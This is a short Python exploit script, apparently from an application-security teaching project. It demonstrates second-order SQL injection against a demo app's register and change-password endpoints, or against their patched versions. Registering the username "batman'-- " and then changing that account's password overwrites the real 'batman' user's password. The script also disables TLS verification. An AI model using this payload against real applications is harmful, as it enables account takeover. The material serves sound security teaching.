import cli
import requests

use_vulnerable_endpoint, use_webapp_url = cli.get_cli_arguments()

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:12300"

if use_vulnerable_endpoint:
    urls = [
        f"{url_prefix}/vulnerabilities/sqli2/register/",
        f"{url_prefix}/vulnerabilities/sqli2/change_password/",
    ]
else:
    urls = [
        f"{url_prefix}/patches/sqli2/register/",
        f"{url_prefix}/patches/sqli2/change_password/",
    ]

# This configures the proxy web address if you are using one. Exploit will work regardless of whether you have a proxy enabled or not.
# This also sets verification of the server TLS certificate to false because the endpoint is just for demonstration purposes. Ignore any warnings associated with not verifying the certificate.
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
requests.packages.urllib3.disable_warnings()


def register(
    username_to_exploit: str, password: str
) -> requests.cookies.RequestsCookieJar:
    username = f"{username_to_exploit}'-- "
    data = {"username": username, "password": password}

    r = requests.post(urls[0], data=data, verify=verify, proxies=proxies)
    print(f"Response: {r.text}\n\n\n")
    return r.cookies


def change_password(cookies: requests.cookies.RequestsCookieJar, password: str) -> None:
    data = {"old": password, "new": password, "new_verify": password}
    r = requests.post(
        urls[1], data=data, cookies=cookies, verify=verify, proxies=proxies
    )
    print(f"Response: {r.text}")


password = "gotham"
username_to_exploit = "batman"
cookies = register(username_to_exploit, password)
change_password(cookies, password)
